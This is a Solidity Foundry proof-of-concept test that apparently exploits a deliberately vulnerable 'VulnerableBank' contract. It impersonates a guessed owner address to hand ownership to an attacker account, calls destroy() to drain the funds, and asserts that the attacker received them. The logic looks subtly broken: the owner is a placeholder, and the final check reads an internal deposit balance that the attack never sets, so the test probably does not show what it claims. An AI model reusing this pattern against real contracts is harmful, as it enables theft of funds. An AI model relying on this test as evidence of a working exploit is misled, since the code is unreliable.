// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/dac4f90e-4c72-4947-a0c9-078502a6a6db_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public override {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Set the attack account as the contract owner
        vm.prank(vm.addr(1)); // Replace addr(1) with a valid address if available
        target.transferOwnership(attacker);

        // Call the destroy function
        vm.startPrank(attacker);
        target.destroy();
        vm.stopPrank();

        // Validate that funds are transferred to the attacker's account
        assertEq(target.balances(attacker), 10 ether);
    }
}